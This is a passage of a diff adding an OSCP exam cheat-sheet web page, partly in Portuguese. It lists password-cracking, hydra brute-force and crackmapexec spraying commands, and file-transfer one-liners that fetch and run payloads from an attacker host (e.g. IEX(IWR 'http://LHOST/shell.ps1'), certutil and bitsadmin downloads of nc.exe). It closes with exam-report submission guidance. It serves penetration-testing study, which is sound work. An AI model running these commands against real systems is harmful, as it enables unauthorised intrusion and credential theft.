+<span class="kc">ssh2john</span> <span class="ac">id_rsa</span> &gt; <span class="oc">ssh.hash</span> &amp;&amp; <span class="kc">john</span> <span class="oc">ssh.hash</span> <span class="fc">--wordlist=</span><span class="oc">rockyou.txt</span>
+<span class="kc">pdf2john</span> <span class="ac">file.pdf</span> &gt; <span class="oc">pdf.hash</span> &amp;&amp; <span class="kc">john</span> <span class="oc">pdf.hash</span> <span class="fc">--wordlist=</span><span class="oc">rockyou.txt</span>
+
+<span class="dc"># Hydra brute force</span>
+<span class="kc">hydra</span> <span class="fc">-l</span> <span class="oc">admin</span> <span class="fc">-P</span> <span class="oc">rockyou.txt</span> <span class="ac">ssh://</span><span class="vc">$IP</span>
+<span class="kc">hydra</span> <span class="fc">-L</span> <span class="oc">users.txt</span> <span class="fc">-P</span> <span class="oc">pass.txt</span> <span class="ac">ftp://</span><span class="vc">$IP</span>
+<span class="kc">hydra</span> <span class="fc">-l</span> <span class="oc">admin</span> <span class="fc">-P</span> <span class="oc">rockyou.txt</span> <span class="vc">$IP</span> <span class="ac">http-post-form</span> <span class="oc">"/login:user=^USER^&amp;pass=^PASS^:Invalid"</span>
+<span class="kc">hydra</span> <span class="fc">-l</span> <span class="oc">admin</span> <span class="fc">-P</span> <span class="oc">rockyou.txt</span> <span class="vc">$IP</span> <span class="ac">rdp</span>
+
+<span class="dc"># CrackMapExec password spray</span>
+<span class="kc">crackmapexec</span> <span class="ac">smb</span> <span class="vc">$IP</span> <span class="fc">-u</span> <span class="oc">users.txt</span> <span class="fc">-p</span> <span class="oc">pass.txt</span> <span class="fc">--no-bruteforce</span>
+<span class="kc">crackmapexec</span> <span class="ac">winrm</span> <span class="vc">$IP</span> <span class="fc">-u</span> <span class="oc">admin</span> <span class="fc">-p</span> <span class="oc">pass</span>
+<span class="kc">crackmapexec</span> <span class="ac">ssh</span> <span class="vc">$IP</span> <span class="fc">-u</span> <span class="oc">admin</span> <span class="fc">-p</span> <span class="oc">rockyou.txt</span></pre><button class="cp-btn" onclick="cpBtn(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ 11 FILE TRANSFER ════ -->
+<section class="sec" id="xfer">
+  <div class="sec-head"><span class="sec-num">11</span><span class="sec-title">File Transfer</span><span class="sec-badge">UP/DOWNLOAD</span></div>
+  <div class="g2">
+    <div class="card cg">
+      <div class="ch"><span>&#128229;</span><span class="t">Download Linux</span></div>
+      <div class="cb0">
+        <div class="cb"><pre>python3 -m http.server 80
+wget http://LHOST/linpeas.sh -O /tmp/lp.sh
+curl http://LHOST/shell.elf -o /tmp/shell
+base64 -w0 file   (attacker: encode)
+echo "B64" | base64 -d &gt; /tmp/file
+chmod +x /tmp/file
+scp user@IP:/path/file .</pre><button class="cp-btn" onclick="cpBtn(this)">COPY</button></div>
+      </div>
+    </div>
+    <div class="card cc">
+      <div class="ch"><span>&#128228;</span><span class="t">Download Windows</span></div>
+      <div class="cb0">
+        <div class="cb"><pre>IEX(IWR 'http://LHOST/shell.ps1' -UseBasicParsing)
+Invoke-WebRequest -Uri "http://LHOST/nc.exe" -OutFile "C:\tmp\nc.exe"
+certutil -urlcache -split -f http://LHOST/file.exe C:\tmp\file.exe
+impacket-smbserver share . -smb2support  (attacker)
+copy \\LHOST\share\file.exe C:\tmp\
+bitsadmin /transfer job http://LHOST/nc.exe C:\tmp\nc.exe</pre><button class="cp-btn" onclick="cpBtn(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ 12 EXAM REPORT ════ -->
+<section class="sec" id="report">
+  <div class="sec-head"><span class="sec-num">12</span><span class="sec-title">Exam Report &#8212; Estrutura &amp; Submissão</span><span class="sec-badge">OBRIGATORIO</span></div>
+  <div class="al al-r" style="margin-bottom:14px"><div class="al-l">CRITICO</div>Report = PDF em .7z ate 24h apos prova. Fail no report = fail automatico.</div>
+  <div class="g2">
+    <div class="card cc">
+      <div class="ch"><span>&#128203;</span><span class="t">Estrutura do Report</span></div>
+      <div class="cb0">
+        <table>
+          <tr><th>#</th><th>Secao</th><th>Conteudo</th></tr>
+          <tr><td>1</td><td>Capa</td><td>Nome, OS-ID, data, titulo</td></tr>
+          <tr><td>2</td><td>Executive Summary</td><td>1-2 paragrafos; impacto geral</td></tr>
+          <tr><td>3</td><td>Methodology</td><td>Fases, tools, approach</td></tr>
+          <tr><td>4</td><td>Machines Table</td><td>IP, hostname, pts, status</td></tr>
+          <tr><td>5</td><td>Machine Reports x N</td><td>Initial access + PrivEsc por maquina</td></tr>
+          <tr><td>6</td><td>Screenshots</td><td>proof.txt + whoami + ip -- 1 imagem por alvo</td></tr>
+          <tr><td>7</td><td>All Commands</td><td>Todos os comandos + console output</td></tr>
+          <tr><td>8</td><td>AD Kill Chain</td><td>Cada etapa + BloodHound screenshots</td></tr>
+          <tr><td>9</td><td>Recommendations</td><td>Opcional -- valorizado pelo avaliador</td></tr>
+        </table>
+      </div>
+    </div>
+    <div class="card cg">
+      <div class="ch"><span>&#128247;</span><span class="t">Screenshots Obrigatorias + Submissao</span></div>
+      <div class="cb0">
+        <div class="cb"><pre># Linux -- screenshot obrigatoria (1 imagem)
+whoami &amp;&amp; hostname &amp;&amp; ip a &amp;&amp; cat /root/proof.txt
+
+# Windows
+whoami &amp;&amp; hostname &amp;&amp; ipconfig &amp;&amp; type C:\Users\Administrator\proof.txt
+
+# Proof files
+local.txt  = user access
+proof.txt  = root / SYSTEM / Domain Admin</pre><button class="cp-btn" onclick="cpBtn(this)">COPY</button></div>
+        <div class="cb"><pre># Nomear PDF corretamente
+OSCP-OS-XXXXX-Exam-Report.pdf
+
+# Comprimir em 7z
+7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
+
+# Verificar MD5
+md5sum OSCP-OS-XXXXX-Exam-Report.7z
+
+# Upload: https://upload.offsec.com
+# Comparar MD5 apos upload -- deve ser IDENTICO!</pre><button class="cp-btn" onclick="cpBtn(this)">COPY</button></div>
+        <div class="al al-y"><div class="al-l">DICA DE OURO</div>Documente ENQUANTO ataca. Use CherryTree ou Obsidian com template por maquina. Sem screenshot = 0 pts.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+<footer style="background:#06060f;border-top:1px solid #1e1e40;padding:18px 40px;text-align:center;font-family:'Share Tech Mono',monospace;font-size:10px;color:#7080a8">
+<span style="color:#00f0ff">OSCP</span> · PEN-200 · OffSec Certified Professional · Cheat Sheet 2026 · by <span style="color:#00f0ff">Mariana Buhrer Sukevicz</span>
+</footer>
+<script>
+function cpBtn(btn){
+  const pre=btn.previousElementSibling;
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='COPIED!';btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('ok')},1500);
+  });
+}
+window.addEventListener('load',()=>{
+  setTimeout(()=>{
+    document.querySelectorAll('.sbd-b').forEach(b=>{
+      const w=b.style.width;b.style.width='0';
+      setTimeout(()=>{b.style.width=w},100);
+    });
+  },400);
+});
+
+function goTo(id){
+  var el = document.getElementById(id);
+  if(el){ el.scrollIntoView({behavior:'smooth', block:'start'}); }
+}
+</script>
+</body>
+</html>
